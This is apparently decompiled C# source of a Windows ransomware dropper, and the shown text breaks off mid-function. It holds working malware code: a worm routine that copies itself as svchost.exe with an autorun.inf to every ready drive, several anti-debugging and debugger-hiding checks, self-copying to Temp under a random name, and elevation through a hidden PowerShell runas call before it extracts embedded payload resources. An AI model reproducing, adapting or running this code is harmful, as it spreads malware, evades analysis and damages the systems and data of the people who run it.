using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

namespace NotRansom_CryptoLock_Dropper;

public class Form1 : Form
{
	[Flags]
	internal enum MoveFileFlags
	{
		None = 0,
		ReplaceExisting = 1,
		CopyAllowed = 2,
		DelayUntilReboot = 4,
		WriteThrough = 8,
		CreateHardlink = 0x10,
		FailIfNotTrackable = 0x20
	}

	internal static class NativeMethods
	{
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, MoveFileFlags dwFlags);
	}

	public enum NtStatus : uint
	{
		Success = 0u,
		Wait0 = 0u,
		Wait1 = 1u,
		Wait2 = 2u,
		Wait3 = 3u,
		Wait63 = 63u,
		Abandoned = 128u,
		AbandonedWait0 = 128u,
		AbandonedWait1 = 129u,
		AbandonedWait2 = 130u,
		AbandonedWait3 = 131u,
		AbandonedWait63 = 191u,
		UserApc = 192u,
		KernelApc = 256u,
		Alerted = 257u,
		Timeout = 258u,
		Pending = 259u,
		Reparse = 260u,
		MoreEntries = 261u,
		NotAllAssigned = 262u,
		SomeNotMapped = 263u,
		OpLockBreakInProgress = 264u,
		VolumeMounted = 265u,
		RxActCommitted = 266u,
		NotifyCleanup = 267u,
		NotifyEnumDir = 268u,
		NoQuotasForAccount = 269u,
		PrimaryTransportConnectFailed = 270u,
		PageFaultTransition = 272u,
		PageFaultDemandZero = 273u,
		PageFaultCopyOnWrite = 274u,
		PageFaultGuardPage = 275u,
		PageFaultPagingFile = 276u,
		CrashDump = 278u,
		ReparseObject = 280u,
		NothingToTerminate = 290u,
		ProcessNotInJob = 291u,
		ProcessInJob = 292u,
		ProcessCloned = 297u,
		FileLockedWithOnlyReaders = 298u,
		FileLockedWithWriters = 299u,
		Informational = 1073741824u,
		ObjectNameExists = 1073741824u,
		ThreadWasSuspended = 1073741825u,
		WorkingSetLimitRange = 1073741826u,
		ImageNotAtBase = 1073741827u,
		RegistryRecovered = 1073741833u,
		Warning = 2147483648u,
		GuardPageViolation = 2147483649u,
		DatatypeMisalignment = 2147483650u,
		Breakpoint = 2147483651u,
		SingleStep = 2147483652u,
		BufferOverflow = 2147483653u,
		NoMoreFiles = 2147483654u,
		HandlesClosed = 2147483658u,
		PartialCopy = 2147483661u,
		DeviceBusy = 2147483665u,
		InvalidEaName = 2147483667u,
		EaListInconsistent = 2147483668u,
		NoMoreEntries = 2147483674u,
		LongJump = 2147483686u,
		DllMightBeInsecure = 2147483691u,
		Error = 3221225472u,
		Unsuccessful = 3221225473u,
		NotImplemented = 3221225474u,
		InvalidInfoClass = 3221225475u,
		InfoLengthMismatch = 3221225476u,
		AccessViolation = 3221225477u,
		InPageError = 3221225478u,
		PagefileQuota = 3221225479u,
		InvalidHandle = 3221225480u,
		BadInitialStack = 3221225481u,
		BadInitialPc = 3221225482u,
		InvalidCid = 3221225483u,
		TimerNotCanceled = 3221225484u,
		InvalidParameter = 3221225485u,
		NoSuchDevice = 3221225486u,
		NoSuchFile = 3221225487u,
		InvalidDeviceRequest = 3221225488u,
		EndOfFile = 3221225489u,
		WrongVolume = 3221225490u,
		NoMediaInDevice = 3221225491u,
		NoMemory = 3221225495u,
		NotMappedView = 3221225497u,
		UnableToFreeVm = 3221225498u,
		UnableToDeleteSection = 3221225499u,
		IllegalInstruction = 3221225501u,
		AlreadyCommitted = 3221225505u,
		AccessDenied = 3221225506u,
		BufferTooSmall = 3221225507u,
		ObjectTypeMismatch = 3221225508u,
		NonContinuableException = 3221225509u,
		BadStack = 3221225512u,
		NotLocked = 3221225514u,
		NotCommitted = 3221225517u,
		InvalidParameterMix = 3221225520u,
		ObjectNameInvalid = 3221225523u,
		ObjectNameNotFound = 3221225524u,
		ObjectNameCollision = 3221225525u,
		ObjectPathInvalid = 3221225529u,
		ObjectPathNotFound = 3221225530u,
		ObjectPathSyntaxBad = 3221225531u,
		DataOverrun = 3221225532u,
		DataLate = 3221225533u,
		DataError = 3221225534u,
		CrcError = 3221225535u,
		SectionTooBig = 3221225536u,
		PortConnectionRefused = 3221225537u,
		InvalidPortHandle = 3221225538u,
		SharingViolation = 3221225539u,
		QuotaExceeded = 3221225540u,
		InvalidPageProtection = 3221225541u,
		MutantNotOwned = 3221225542u,
		SemaphoreLimitExceeded = 3221225543u,
		PortAlreadySet = 3221225544u,
		SectionNotImage = 3221225545u,
		SuspendCountExceeded = 3221225546u,
		ThreadIsTerminating = 3221225547u,
		BadWorkingSetLimit = 3221225548u,
		IncompatibleFileMap = 3221225549u,
		SectionProtection = 3221225550u,
		EasNotSupported = 3221225551u,
		EaTooLarge = 3221225552u,
		NonExistentEaEntry = 3221225553u,
		NoEasOnFile = 3221225554u,
		EaCorruptError = 3221225555u,
		FileLockConflict = 3221225556u,
		LockNotGranted = 3221225557u,
		DeletePending = 3221225558u,
		CtlFileNotSupported = 3221225559u,
		UnknownRevision = 3221225560u,
		RevisionMismatch = 3221225561u,
		InvalidOwner = 3221225562u,
		InvalidPrimaryGroup = 3221225563u,
		NoImpersonationToken = 3221225564u,
		CantDisableMandatory = 3221225565u,
		NoLogonServers = 3221225566u,
		NoSuchLogonSession = 3221225567u,
		NoSuchPrivilege = 3221225568u,
		PrivilegeNotHeld = 3221225569u,
		InvalidAccountName = 3221225570u,
		UserExists = 3221225571u,
		NoSuchUser = 3221225572u,
		GroupExists = 3221225573u,
		NoSuchGroup = 3221225574u,
		MemberInGroup = 3221225575u,
		MemberNotInGroup = 3221225576u,
		LastAdmin = 3221225577u,
		WrongPassword = 3221225578u,
		IllFormedPassword = 3221225579u,
		PasswordRestriction = 3221225580u,
		LogonFailure = 3221225581u,
		AccountRestriction = 3221225582u,
		InvalidLogonHours = 3221225583u,
		InvalidWorkstation = 3221225584u,
		PasswordExpired = 3221225585u,
		AccountDisabled = 3221225586u,
		NoneMapped = 3221225587u,
		TooManyLuidsRequested = 3221225588u,
		LuidsExhausted = 3221225589u,
		InvalidSubAuthority = 3221225590u,
		InvalidAcl = 3221225591u,
		InvalidSid = 3221225592u,
		InvalidSecurityDescr = 3221225593u,
		ProcedureNotFound = 3221225594u,
		InvalidImageFormat = 3221225595u,
		NoToken = 3221225596u,
		BadInheritanceAcl = 3221225597u,
		RangeNotLocked = 3221225598u,
		DiskFull = 3221225599u,
		ServerDisabled = 3221225600u,
		ServerNotDisabled = 3221225601u,
		TooManyGuidsRequested = 3221225602u,
		GuidsExhausted = 3221225603u,
		InvalidIdAuthority = 3221225604u,
		AgentsExhausted = 3221225605u,
		InvalidVolumeLabel = 3221225606u,
		SectionNotExtended = 3221225607u,
		NotMappedData = 3221225608u,
		ResourceDataNotFound = 3221225609u,
		ResourceTypeNotFound = 3221225610u,
		ResourceNameNotFound = 3221225611u,
		ArrayBoundsExceeded = 3221225612u,
		FloatDenormalOperand = 3221225613u,
		FloatDivideByZero = 3221225614u,
		FloatInexactResult = 3221225615u,
		FloatInvalidOperation = 3221225616u,
		FloatOverflow = 3221225617u,
		FloatStackCheck = 3221225618u,
		FloatUnderflow = 3221225619u,
		IntegerDivideByZero = 3221225620u,
		IntegerOverflow = 3221225621u,
		PrivilegedInstruction = 3221225622u,
		TooManyPagingFiles = 3221225623u,
		FileInvalid = 3221225624u,
		InstanceNotAvailable = 3221225643u,
		PipeNotAvailable = 3221225644u,
		InvalidPipeState = 3221225645u,
		PipeBusy = 3221225646u,
		IllegalFunction = 3221225647u,
		PipeDisconnected = 3221225648u,
		PipeClosing = 3221225649u,
		PipeConnected = 3221225650u,
		PipeListening = 3221225651u,
		InvalidReadMode = 3221225652u,
		IoTimeout = 3221225653u,
		FileForcedClosed = 3221225654u,
		ProfilingNotStarted = 3221225655u,
		ProfilingNotStopped = 3221225656u,
		NotSameDevice = 3221225684u,
		FileRenamed = 3221225685u,
		CantWait = 3221225688u,
		PipeEmpty = 3221225689u,
		CantTerminateSelf = 3221225691u,
		InternalError = 3221225701u,
		InvalidParameter1 = 3221225711u,
		InvalidParameter2 = 3221225712u,
		InvalidParameter3 = 3221225713u,
		InvalidParameter4 = 3221225714u,
		InvalidParameter5 = 3221225715u,
		InvalidParameter6 = 3221225716u,
		InvalidParameter7 = 3221225717u,
		InvalidParameter8 = 3221225718u,
		InvalidParameter9 = 3221225719u,
		InvalidParameter10 = 3221225720u,
		InvalidParameter11 = 3221225721u,
		InvalidParameter12 = 3221225722u,
		MappedFileSizeZero = 3221225758u,
		TooManyOpenedFiles = 3221225759u,
		Cancelled = 3221225760u,
		CannotDelete = 3221225761u,
		InvalidComputerName = 3221225762u,
		FileDeleted = 3221225763u,
		SpecialAccount = 3221225764u,
		SpecialGroup = 3221225765u,
		SpecialUser = 3221225766u,
		MembersPrimaryGroup = 3221225767u,
		FileClosed = 3221225768u,
		TooManyThreads = 3221225769u,
		ThreadNotInProcess = 3221225770u,
		TokenAlreadyInUse = 3221225771u,
		PagefileQuotaExceeded = 3221225772u,
		CommitmentLimit = 3221225773u,
		InvalidImageLeFormat = 3221225774u,
		InvalidImageNotMz = 3221225775u,
		InvalidImageProtect = 3221225776u,
		InvalidImageWin16 = 3221225777u,
		LogonServer = 3221225778u,
		DifferenceAtDc = 3221225779u,
		SynchronizationRequired = 3221225780u,
		DllNotFound = 3221225781u,
		IoPrivilegeFailed = 3221225783u,
		OrdinalNotFound = 3221225784u,
		EntryPointNotFound = 3221225785u,
		ControlCExit = 3221225786u,
		PortNotSet = 3221226323u,
		DebuggerInactive = 3221226324u,
		CallbackBypass = 3221226755u,
		PortClosed = 3221227264u,
		MessageLost = 3221227265u,
		InvalidMessage = 3221227266u,
		RequestCanceled = 3221227267u,
		RecursiveDispatch = 3221227268u,
		LpcReceiveBufferExpected = 3221227269u,
		LpcInvalidConnectionUsage = 3221227270u,
		LpcRequestsNotAllowed = 3221227271u,
		ResourceInUse = 3221227272u,
		ProcessIsProtected = 3221227282u,
		VolumeDirty = 3221227526u,
		FileCheckedOut = 3221227777u,
		CheckOutRequired = 3221227778u,
		BadFileType = 3221227779u,
		FileTooLarge = 3221227780u,
		FormsAuthRequired = 3221227781u,
		VirusInfected = 3221227782u,
		VirusDeleted = 3221227783u,
		TransactionalConflict = 3222863873u,
		InvalidTransaction = 3222863874u,
		TransactionNotActive = 3222863875u,
		TmInitializationFailed = 3222863876u,
		RmNotActive = 3222863877u,
		RmMetadataCorrupt = 3222863878u,
		TransactionNotJoined = 3222863879u,
		DirectoryNotRm = 3222863880u,
		CouldNotResizeLog = 3222863881u,
		TransactionsUnsupportedRemote = 3222863882u,
		LogResizeInvalidSize = 3222863883u,
		RemoteFileVersionMismatch = 3222863884u,
		CrmProtocolAlreadyExists = 3222863887u,
		TransactionPropagationFailed = 3222863888u,
		CrmProtocolNotFound = 3222863889u,
		TransactionSuperiorExists = 3222863890u,
		TransactionRequestNotValid = 3222863891u,
		TransactionNotRequested = 3222863892u,
		TransactionAlreadyAborted = 3222863893u,
		TransactionAlreadyCommitted = 3222863894u,
		TransactionInvalidMarshallBuffer = 3222863895u,
		CurrentTransactionNotValid = 3222863896u,
		LogGrowthFailed = 3222863897u,
		ObjectNoLongerExists = 3222863905u,
		StreamMiniversionNotFound = 3222863906u,
		StreamMiniversionNotValid = 3222863907u,
		MiniversionInaccessibleFromSpecifiedTransaction = 3222863908u,
		CantOpenMiniversionWithModifyIntent = 3222863909u,
		CantCreateMoreStreamMiniversions = 3222863910u,
		HandleNoLongerValid = 3222863912u,
		NoTxfMetadata = 3222863913u,
		LogCorruptionDetected = 3222863920u,
		CantRecoverWithHandleOpen = 3222863921u,
		RmDisconnected = 3222863922u,
		EnlistmentNotSuperior = 3222863923u,
		RecoveryNotNeeded = 3222863924u,
		RmAlreadyStarted = 3222863925u,
		FileIdentityNotPersistent = 3222863926u,
		CantBreakTransactionalDependency = 3222863927u,
		CantCrossRmBoundary = 3222863928u,
		TxfDirNotEmpty = 3222863929u,
		IndoubtTransactionsExist = 3222863930u,
		TmVolatile = 3222863931u,
		RollbackTimerExpired = 3222863932u,
		TxfAttributeCorrupt = 3222863933u,
		EfsNotAllowedInTransaction = 3222863934u,
		TransactionalOpenNotAllowed = 3222863935u,
		TransactedMappingUnsupportedRemote = 3222863936u,
		TxfMetadataAlreadyPresent = 3222863937u,
		TransactionScopeCallbacksNotSet = 3222863938u,
		TransactionRequiredPromotion = 3222863939u,
		CannotExecuteFileInTransaction = 3222863940u,
		TransactionsNotFrozen = 3222863941u,
		MaximumNtStatus = uint.MaxValue
	}

	public enum PROCESSINFOCLASS
	{
		ProcessBasicInformation,
		ProcessQuotaLimits,
		ProcessIoCounters,
		ProcessVmCounters,
		ProcessTimes,
		ProcessBasePriority,
		ProcessRaisePriority,
		ProcessDebugPort,
		ProcessExceptionPort,
		ProcessAccessToken,
		ProcessLdtInformation,
		ProcessLdtSize,
		ProcessDefaultHardErrorMode,
		ProcessIoPortHandlers,
		ProcessPooledUsageAndLimits,
		ProcessWorkingSetWatch,
		ProcessUserModeIOPL,
		ProcessEnableAlignmentFaultFixup,
		ProcessPriorityClass,
		ProcessWx86Information,
		ProcessHandleCount,
		ProcessAffinityMask,
		ProcessPriorityBoost,
		ProcessDeviceMap,
		ProcessSessionInformation,
		ProcessForegroundInformation,
		ProcessWow64Information,
		ProcessImageFileName,
		ProcessLUIDDeviceMapsEnabled,
		ProcessBreakOnTermination,
		ProcessDebugObjectHandle,
		ProcessDebugFlags,
		ProcessHandleTracing,
		ProcessIoPriority,
		ProcessExecuteFlags,
		ProcessResourceManagement,
		ProcessCookie,
		ProcessImageInformation,
		ProcessCycleTime,
		ProcessPagePriority,
		ProcessInstrumentationCallback,
		ProcessThreadStackAllocation,
		ProcessWorkingSetWatchEx,
		ProcessImageFileNameWin32,
		ProcessImageFileMapping,
		ProcessAffinityUpdateMode,
		ProcessMemoryAllocationMode,
		ProcessGroupInformation,
		ProcessTokenVirtualizationEnabled,
		ProcessConsoleHostProcess,
		ProcessWindowInformation,
		ProcessHandleInformation,
		ProcessMitigationPolicy,
		ProcessDynamicFunctionTableInformation,
		ProcessHandleCheckingMode,
		ProcessKeepAliveCount,
		ProcessRevokeFileHandles,
		ProcessWorkingSetControl,
		ProcessHandleTable,
		ProcessCheckStackExtentsMode,
		ProcessCommandLineInformation,
		ProcessProtectionInformation,
		MaxProcessInfoClass
	}

	[Flags]
	public enum DebugObjectInformationClass
	{
		DebugObjectFlags = 1,
		MaxDebugObjectInfoClass = 2
	}

	public enum SYSTEM_INFORMATION_CLASS
	{
		SystemBasicInformation,
		SystemProcessorInformation,
		SystemPerformanceInformation,
		SystemTimeOfDayInformation,
		SystemPathInformation,
		SystemProcessInformation,
		SystemCallCountInformation,
		SystemDeviceInformation,
		SystemProcessorPerformanceInformation,
		SystemFlagsInformation,
		SystemCallTimeInformation,
		SystemModuleInformation,
		SystemLocksInformation,
		SystemStackTraceInformation,
		SystemPagedPoolInformation,
		SystemNonPagedPoolInformation,
		SystemHandleInformation,
		SystemObjectInformation,
		SystemPageFileInformation,
		SystemVdmInstemulInformation,
		SystemVdmBopInformation,
		SystemFileCacheInformation,
		SystemPoolTagInformation,
		SystemInterruptInformation,
		SystemDpcBehaviorInformation,
		SystemFullMemoryInformation,
		SystemLoadGdiDriverInformation,
		SystemUnloadGdiDriverInformation,
		SystemTimeAdjustmentInformation,
		SystemSummaryMemoryInformation,
		SystemMirrorMemoryInformation,
		SystemPerformanceTraceInformation,
		SystemObsolete0,
		SystemExceptionInformation,
		SystemCrashDumpStateInformation,
		SystemKernelDebuggerInformation,
		SystemContextSwitchInformation,
		SystemRegistryQuotaInformation,
		SystemExtendServiceTableInformation,
		SystemPrioritySeperation,
		SystemVerifierAddDriverInformation,
		SystemVerifierRemoveDriverInformation,
		SystemProcessorIdleInformation,
		SystemLegacyDriverInformation,
		SystemCurrentTimeZoneInformation,
		SystemLookasideInformation,
		SystemTimeSlipNotification,
		SystemSessionCreate,
		SystemSessionDetach,
		SystemSessionInformation,
		SystemRangeStartInformation,
		SystemVerifierInformation,
		SystemVerifierThunkExtend,
		SystemSessionProcessInformation,
		SystemLoadGdiDriverInSystemSpace,
		SystemNumaProcessorMap,
		SystemPrefetcherInformation,
		SystemExtendedProcessInformation,
		SystemRecommendedSharedDataAlignment,
		SystemComPlusPackage,
		SystemNumaAvailableMemory,
		SystemProcessorPowerInformation,
		SystemEmulationBasicInformation,
		SystemEmulationProcessorInformation,
		SystemExtendedHandleInformation,
		SystemLostDelayedWriteInformation,
		SystemBigPoolInformation,
		SystemSessionPoolTagInformation,
		SystemSessionMappedViewInformation,
		SystemHotpatchInformation,
		SystemObjectSecurityMode,
		SystemWatchdogTimerHandler,
		SystemWatchdogTimerInformation,
		SystemLogicalProcessorInformation,
		SystemWow64SharedInformationObsolete,
		SystemRegisterFirmwareTableInformationHandler,
		SystemFirmwareTableInformation,
		SystemModuleInformationEx,
		SystemVerifierTriageInformation,
		SystemSuperfetchInformation,
		SystemMemoryListInformation,
		SystemFileCacheInformationEx,
		SystemThreadPriorityClientIdInformation,
		SystemProcessorIdleCycleTimeInformation,
		SystemVerifierCancellationInformation,
		SystemProcessorPowerInformationEx,
		SystemRefTraceInformation,
		SystemSpecialPoolInformation,
		SystemProcessIdInformation,
		SystemErrorPortInformation,
		SystemBootEnvironmentInformation,
		SystemHypervisorInformation,
		SystemVerifierInformationEx,
		SystemTimeZoneInformation,
		SystemImageFileExecutionOptionsInformation,
		SystemCoverageInformation,
		SystemPrefetchPatchInformation,
		SystemVerifierFaultsInformation,
		SystemSystemPartitionInformation,
		SystemSystemDiskInformation,
		SystemProcessorPerformanceDistribution,
		SystemNumaProximityNodeInformation,
		SystemDynamicTimeZoneInformation,
		SystemCodeIntegrityInformation,
		SystemProcessorMicrocodeUpdateInformation,
		SystemProcessorBrandString,
		SystemVirtualAddressInformation,
		SystemLogicalProcessorAndGroupInformation,
		SystemProcessorCycleTimeInformation,
		SystemStoreInformation,
		SystemRegistryAppendString,
		SystemAitSamplingValue,
		SystemVhdBootInformation,
		SystemCpuQuotaInformation,
		SystemNativeBasicInformation,
		SystemSpare1,
		SystemLowPriorityIoInformation,
		SystemTpmBootEntropyInformation,
		SystemVerifierCountersInformation,
		SystemPagedPoolInformationEx,
		SystemSystemPtesInformationEx,
		SystemNodeDistanceInformation,
		SystemAcpiAuditInformation,
		SystemBasicPerformanceInformation,
		SystemQueryPerformanceCounterInformation,
		SystemSessionBigPoolInformation,
		SystemBootGraphicsInformation,
		SystemScrubPhysicalMemoryInformation,
		SystemBadPageInformation,
		SystemProcessorProfileControlArea,
		SystemCombinePhysicalMemoryInformation,
		SystemEntropyInterruptTimingCallback,
		SystemConsoleInformation,
		SystemPlatformBinaryInformation,
		SystemThrottleNotificationInformation,
		SystemHypervisorProcessorCountInformation,
		SystemDeviceDataInformation,
		SystemDeviceDataEnumerationInformation,
		SystemMemoryTopologyInformation,
		SystemMemoryChannelInformation,
		SystemBootLogoInformation,
		SystemProcessorPerformanceInformationEx,
		SystemSpare0,
		SystemSecureBootPolicyInformation,
		SystemPageFileInformationEx,
		SystemSecureBootInformation,
		SystemEntropyInterruptTimingRawInformation,
		SystemPortableWorkspaceEfiLauncherInformation,
		SystemFullProcessInformation,
		SystemKernelDebuggerInformationEx,
		SystemBootMetadataInformation,
		SystemSoftRebootInformation,
		SystemElamCertificateInformation,
		SystemOfflineDumpConfigInformation,
		SystemProcessorFeaturesInformation,
		SystemRegistryReconciliationInformation,
		SystemEdidInformation,
		MaxSystemInfoClass
	}

	public enum ThreadInformationClass
	{
		ThreadBasicInformation = 0,
		ThreadTimes = 1,
		ThreadPriority = 2,
		ThreadBasePriority = 3,
		ThreadAffinityMask = 4,
		ThreadImpersonationToken = 5,
		ThreadDescriptorTableEntry = 6,
		ThreadEnableAlignmentFaultFixup = 7,
		ThreadEventPair_Reusable = 8,
		ThreadQuerySetWin32StartAddress = 9,
		ThreadZeroTlsCell = 10,
		ThreadPerformanceCount = 11,
		ThreadAmILastThread = 12,
		ThreadIdealProcessor = 13,
		ThreadPriorityBoost = 14,
		ThreadSetTlsArrayAddress = 15,
		ThreadIsIoPending = 16,
		ThreadHideFromDebugger = 17,
		ThreadBreakOnTermination = 18,
		ThreadSwitchLegacyState = 19,
		ThreadIsTerminated = 20,
		ThreadLastSystemCall = 21,
		ThreadIoPriority = 22,
		ThreadCycleTime = 23,
		ThreadPagePriority = 24,
		ThreadActualBasePriority = 25,
		ThreadTebInformation = 26,
		ThreadCSwitchMon = 27,
		ThreadCSwitchPmu = 28,
		ThreadWow64Context = 29,
		ThreadGroupInformation = 30,
		ThreadUmsInformation = 31,
		ThreadCounterProfiling = 32,
		ThreadIdealProcessorEx = 33,
		ThreadCpuAccountingInformation = 34,
		ThreadSuspendCount = 35,
		ThreadDescription = 38,
		ThreadActualGroupAffinity = 41,
		ThreadDynamicCodePolicy = 42
	}

	[Flags]
	public enum ThreadAccess
	{
		TERMINATE = 1,
		SUSPEND_RESUME = 2,
		GET_CONTEXT = 8,
		SET_CONTEXT = 0x10,
		SET_INFORMATION = 0x20,
		QUERY_INFORMATION = 0x40,
		SET_THREAD_TOKEN = 0x80,
		IMPERSONATE = 0x100,
		DIRECT_IMPERSONATION = 0x200
	}

	public struct SYSTEM_KERNEL_DEBUGGER_INFORMATION
	{
		[MarshalAs(UnmanagedType.U1)]
		public bool KernelDebuggerEnabled;

		[MarshalAs(UnmanagedType.U1)]
		public bool KernelDebuggerNotPresent;
	}

	private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		using Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void worm()
	{
		try
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			for (int i = 0; i < text.Length; i++)
			{
				if (new DriveInfo(text[i].ToString()).IsReady)
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Path.Combine(text[i] + ":\\", "svchost.exe"), overwrite: true);
					Extract("NotRansom_CryptoLock_Dropper", Path.Combine(text[i] + ":\\"), "Resources", "autorun.inf");
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private bool IsAdministrator()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static string RansomString(int length)
	{
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[(length * 6 + 7) / 8];
		rNGCryptoServiceProvider.GetBytes(array);
		return Convert.ToBase64String(array);
	}

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsDebuggerPresent();

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] PROCESSINFOCLASS ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, [Optional] out int ReturnLength);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtClose([In] IntPtr Handle);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtRemoveProcessDebug(IntPtr ProcessHandle, IntPtr DebugObjectHandle);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtSetInformationDebugObject([In] IntPtr DebugObjectHandle, [In] DebugObjectInformationClass DebugObjectInformationClass, [In] IntPtr DebugObjectInformation, [In] int DebugObjectInformationLength, [Optional] out int ReturnLength);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtQuerySystemInformation([In] SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, [In] int SystemInformationLength, [Optional] out int ReturnLength);

	[DllImport("ntdll.dll")]
	internal static extern NtStatus NtSetInformationThread(IntPtr ThreadHandle, ThreadInformationClass ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll")]
	private static extern uint SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr hThread);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CloseHandle(IntPtr handle);

	private static int CheckDebuggerManagedPresent()
	{
		if (Debugger.IsAttached)
		{
			return 1;
		}
		return 0;
	}

	private static int CheckDebuggerUnmanagedPresent()
	{
		if (IsDebuggerPresent())
		{
			return 1;
		}
		return 0;
	}

	private static int CheckRemoteDebugger()
	{
		bool isDebuggerPresent = false;
		if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent) && isDebuggerPresent)
		{
			return 1;
		}
		return 0;
	}

	private static int CheckDebugPort()
	{
		IntPtr ProcessInformation = new IntPtr(0);
		if (NtQueryInformationProcess(Process.GetCurrentProcess().Handle, PROCESSINFOCLASS.ProcessDebugPort, out ProcessInformation, Marshal.SizeOf(ProcessInformation), out var _) == NtStatus.Success && ProcessInformation == new IntPtr(-1))
		{
			Console.WriteLine("DebugPort : {0:X}", ProcessInformation);
			return 1;
		}
		return 0;
	}

	private unsafe static bool DetachFromDebuggerProcess()
	{
		IntPtr ProcessInformation = INVALID_HANDLE_VALUE;
		uint structure = 0u;
		if (NtQueryInformationProcess(Process.GetCurrentProcess().Handle, PROCESSINFOCLASS.ProcessDebugObjectHandle, out ProcessInformation, IntPtr.Size, out var _) != 0)
		{
			return false;
		}
		if (NtSetInformationDebugObject(ProcessInformation, DebugObjectInformationClass.DebugObjectFlags, new IntPtr(&structure), Marshal.SizeOf(structure), out var _) != 0)
		{
			return false;
		}
		if (NtRemoveProcessDebug(Process.GetCurrentProcess().Handle, ProcessInformation) != 0)
		{
			return false;
		}
		if (NtClose(ProcessInformation) != 0)
		{
			return false;
		}
		return true;
	}

	private unsafe static bool CheckKernelDebugInformation()
	{
		SYSTEM_KERNEL_DEBUGGER_INFORMATION structure = default(SYSTEM_KERNEL_DEBUGGER_INFORMATION);
		if (NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemKernelDebuggerInformation, new IntPtr(&structure), Marshal.SizeOf(structure), out var _) == NtStatus.Success && structure.KernelDebuggerEnabled && !structure.KernelDebuggerNotPresent)
		{
			return true;
		}
		return false;
	}

	public static bool HideFromDebugger(IntPtr Handle)
	{
		if (NtSetInformationThread(Handle, ThreadInformationClass.ThreadHideFromDebugger, IntPtr.Zero, 0) == NtStatus.Success)
		{
			return true;
		}
		return false;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_028e: Unknown result type (might be due to invalid IL or missing references)
		string name = "WindowsServiceEtc";
		bool createdNew = false;
		Mutex mutex = new Mutex(initiallyOwned: true, name, out createdNew);
		if (createdNew)
		{
			try
			{
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run((Form)(object)new Form1());
			}
			catch
			{
			}
			finally
			{
				mutex.ReleaseMutex();
				mutex.Close();
			}
		}
		else
		{
			mutex.Close();
			Environment.Exit(0);
		}
		if (CheckDebugPort() == 1)
		{
			while (true)
			{
			}
		}
		if (CheckKernelDebugInformation())
		{
			while (true)
			{
			}
		}
		if (DetachFromDebuggerProcess())
		{
			while (true)
			{
			}
		}
		if (CheckDebuggerManagedPresent() == 1)
		{
			while (true)
			{
			}
		}
		if (CheckDebuggerUnmanagedPresent() == 1)
		{
			while (true)
			{
			}
		}
		if (CheckRemoteDebugger() == 1)
		{
			while (true)
			{
			}
		}
		foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
		{
			IntPtr intPtr = OpenThread(ThreadAccess.SET_INFORMATION, bInheritHandle: false, (uint)thread.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				HideFromDebugger(intPtr);
				CloseHandle(intPtr);
			}
		}
		string tempPath = Path.GetTempPath();
		string text = Path.Combine(tempPath, RansomString(10) + ".exe");
		if (!Assembly.GetExecutingAssembly().Location.Contains("Temp"))
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, text, overwrite: true);
			Thread.Sleep(10000);
			Process process = new Process();
			process.StartInfo.FileName = "powershell.exe";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Arguments = "start-process " + text + " -verb runas";
			process.Start();
			Environment.Exit(0);
		}
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			Path.Combine(tempPath, "WallPaper.jpg");
			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "d.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "e.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "n.nrcl");
